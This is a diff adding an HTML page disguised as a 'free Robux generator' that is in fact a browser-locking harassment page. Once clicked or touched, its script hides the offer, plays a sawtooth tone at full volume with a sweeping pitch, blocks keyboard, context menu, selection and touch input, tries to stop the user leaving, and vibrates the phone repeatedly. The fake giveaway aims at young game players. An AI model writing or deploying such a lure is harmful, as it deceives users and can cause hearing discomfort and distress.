@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🔥 FREE ROBUX GENERATOR 🔥</title>
+    <style>
+        * { margin:0; padding:0; }
+        body {
+            font-family: Arial;
+            background: linear-gradient(45deg, #ff0000, #ff6600, #ffff00);
+            animation: pulse 0.5s infinite;
+            height: 100vh;
+            overflow: hidden;
+            color: white;
+            text-align: center;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 100;
+        }
+        button {
+            font-size: 24px;
+            padding: 20px 40px;
+            background: #00ff00;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: 0 0 20px #00ff00;
+        }
+        .hidden { display: none !important; }
+        canvas { position: fixed; top:0; left:0; z-index: -1; }
+    </style>
+</head>
+<body>
+    <canvas id="bg"></canvas>
+    
+    <div class="container">
+        <h1>🎉 ROBUX GENERATOR 2026 🎉</h1>
+        <p>Click to get <b>10,000 FREE ROBUX</b> instantly!</p>
+        <button onclick="startHell()">🚀 CLAIM NOW 🚀</button>
+        <p style="font-size: 14px; margin-top: 20px;">No human verification needed!</p>
+    </div>
+
+    <script>
+        // Create flashing background
+        const canvas = document.getElementById('bg');
+        const ctx = canvas.getContext('2d');
+        function resize() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resize);
+        resize();
+
+        function animate() {
+            ctx.fillStyle = `hsl(${Date.now()*0.1%360}, 100%, 50%)`;
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            requestAnimationFrame(animate);
+        }
+        animate();
+
+        // THE HELL FUNCTION
+        function startHell() {
+            document.querySelector('.container').classList.add('hidden');
+            
+            // Create LOUD NOISE
+            const audioCtx = new AudioContext();
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+            
+            oscillator.frequency.value = 800; // Annoying pitch
+            oscillator.type = 'sawtooth'; // Harsh sound
+            
+            // MAX VOLUME
+            gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
+            
+            oscillator.start();
+            
+            // Pitch sweep for maximum pain
+            let freq = 800;
+            const sweep = setInterval(() => {
+                freq += 50;
+                if (freq > 2000) freq = 800;
+                oscillator.frequency.value = freq;
+            }, 100);
+
+            // BLOCK EVERYTHING
+            document.onkeydown = e => e.preventDefault();
+            document.oncontextmenu = () => false;
+            document.ondragstart = () => false;
+            document.onselectstart = () => false;
+            
+            // Mobile touch block
+            document.addEventListener('touchstart', e => e.preventDefault(), {passive:false});
+            document.addEventListener('touchmove', e => e.preventDefault(), {passive:false});
+            
+            // Prevent leaving page
+            window.onbeforeunload = () => "ROBUX WILL BE LOST!";
+            
+            // Phone vibration hell
+            if (navigator.vibrate) {
+                navigator.vibrate(200);
+                setInterval(() => navigator.vibrate(100), 500);
+            }
+            
+            // Keep audio alive
+            setInterval(() => {
+                if (audioCtx.state === 'suspended') audioCtx.resume();
+            }, 1000);
+        }
+
+        // Auto-trigger on any interaction (backup)
+        document.addEventListener('click', startHell, {once: true});
+        document.addEventListener('touchstart', startHell, {once: true});
+    </script>
+</body>
+</html>
